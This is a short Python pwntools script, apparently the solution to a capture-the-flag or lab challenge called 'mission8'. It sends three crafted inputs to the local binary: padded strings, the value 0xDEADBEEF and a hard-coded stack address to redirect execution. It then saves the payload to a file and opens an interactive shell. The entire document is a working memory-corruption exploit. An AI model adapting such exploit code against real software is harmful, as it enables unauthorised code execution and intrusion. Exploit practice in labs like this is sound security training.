#!/bin/python
from pwn import *
import os


p = process("./mission8")

val = "admin" + "\0" * 51
exploit = val
p.send(val)


val = "A" + "\0" * 895
exploit += val
p.send(val)

value = str(0xDEADBEEF) # "3735928559"

val = value  + "A" * (16 - len(value)) + p64(0x7fffffffd930 + 0x40)
exploit += val
p.send(val)

with open("writable/exploit.bin", "wb") as f:
	f.write(exploit)

p.interactive()

